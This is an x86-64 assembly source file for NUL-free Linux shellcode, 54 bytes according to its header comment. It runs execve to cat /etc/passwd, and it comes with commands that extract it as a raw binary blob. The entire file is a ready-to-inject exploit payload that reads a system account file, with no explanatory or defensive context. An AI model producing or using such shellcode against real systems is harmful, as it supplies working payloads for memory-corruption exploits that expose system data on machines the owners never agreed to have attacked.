/*
 * cat_passwd64.s - execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)
 * 54 bytes, sin NUL.
 *   as --64 -o cat_passwd64.o cat_passwd64.s
 *   objcopy -O binary -j .text cat_passwd64.o cat_passwd64.bin
 */

.intel_syntax noprefix
.global _start

_start:
    xor     edx, edx
    push    rdx
    mov     eax, 0x64777373
    shr     eax, 8
    push    rax
    mov     rax, 0x7361702f6374652f
    push    rax
    push    rdx
    mov     rax, 0x7461632f6e69622f
    push    rax
    mov     rdi, rsp
    lea     rbx, [rsp + 0x10]
    push    rdx
    push    rbx
    push    rdi
    mov     rsi, rsp
    push    0x3b
    pop     rax
    syscall
